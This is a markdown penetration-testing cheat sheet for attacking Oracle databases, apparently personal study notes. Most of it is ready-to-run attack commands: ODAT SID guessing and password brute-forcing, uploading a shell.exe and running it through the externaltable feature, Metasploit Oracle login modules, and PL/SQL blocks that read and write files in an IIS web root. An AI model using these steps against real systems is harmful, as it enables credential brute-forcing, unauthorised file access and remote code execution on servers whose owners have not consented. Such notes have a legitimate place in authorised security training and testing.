# Oracle

> Oracle Database is a multi-model database management system produced and marketed by Oracle Corporation. It is a database commonly used for running online transaction processing, data warehousing and mixed database workloads.   

## General 

`sysdba` is like sudo


## ODAT

Oracle Database Attacking Tool
[GitHub - quentinhardy/odat: ODAT](https://github.com/quentinhardy/odat)

### guess sid (Oracle System ID)

```bash
odat.py sidguesser -s <ip> -p <port>
```

### guess password (using sid)

```bash
/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
```
-> replace ` ` by `/`

```bash
odat.py passwordguesser -d <sid> --accounts-file <file> -s <ip>
```

### download/upload/delete files

```bash
./odat.py utlfile -s <ip> --sysdba -d XE -U <user> -P <password> --putFile /temp shell.exe ../shell.exe
```

### read files or execute system commands/scripts
```bash
./odat.py externaltable -s <ip> --sysdba -d XE -U <user> -P <password> --exec /temp shell.exe
```

## sqlplus

> **SQL Plus** is the most basic  [Oracle Database](https://en.wikipedia.org/wiki/Oracle_Database)  utility, with a basic  [command-line interface](https://en.wikipedia.org/wiki/Command-line_interface) , commonly used by users, administrators, and programmers.  

```bash
sqlplus <user>/<pass>@<ip>:<port>/<sid> as sysdba
```

## Metasploit

```bash
admin/oracle/sid_brute
```

```bash
admin/oracle/oracle_login
```

## file operations

### read

```
declare 
	f utl_file.file_type;
	s varchar(200);
begin
	f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.html', 'R');
	utl_file.get_line(f, s);
	utl_file.close(f);
	dbms_output.put_line(s);
end;
```

enable display of output
```bash
set serveroutput ON
```

execute it
```bash
/
```

### write

```
declare 
	f utl_file.file_type;
	s varchar(5000) := 'contents';
begin
	f := utl_file.fopen('/inetpub/wwwroot', 'file.txt', 'W');
	utl_file.put_line(f, s);
	utl_file.close(f);
	dbms_output.put_line(s);
end;
```

execute it 
```bash
/
```

## check privs 

```bash
select * from session_privs;
select * from user_role_privs;
```
